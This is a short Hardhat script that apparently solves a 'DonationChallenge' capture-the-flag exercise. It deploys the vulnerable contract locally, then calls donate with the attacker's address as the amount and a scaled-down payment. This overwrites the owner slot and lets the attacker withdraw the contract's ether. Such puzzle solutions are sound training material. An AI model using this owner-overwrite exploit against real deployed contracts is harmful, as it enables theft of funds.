import { ethers } from "hardhat";

async function main() {
  const accounts = await ethers.getSigners();
  const amount = ethers.parseEther("1");
  const attacker = accounts[0];

  // deploy contract
  const contract = await ethers.deployContract("DonationChallenge", {
    value: amount,
  });
  await contract.waitForDeployment();

  // use address for ether amount
  const address = BigInt(await attacker.getAddress());
  const etherAmount = address;

  // convert value with scale for require statement
  const scale = BigInt("10") ** BigInt("36");
  const msgValue = etherAmount / scale;

  // donate etheramount and value connected as attacker
  const donate = await contract
    .connect(attacker)
    .donate(etherAmount, { value: msgValue });
  await donate.wait();

  // withdraw connected as attacker
  const withdraw = await contract.connect(attacker).withdraw();
  await withdraw.wait();

  const isComplete = await contract.isComplete();
  console.log(isComplete);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
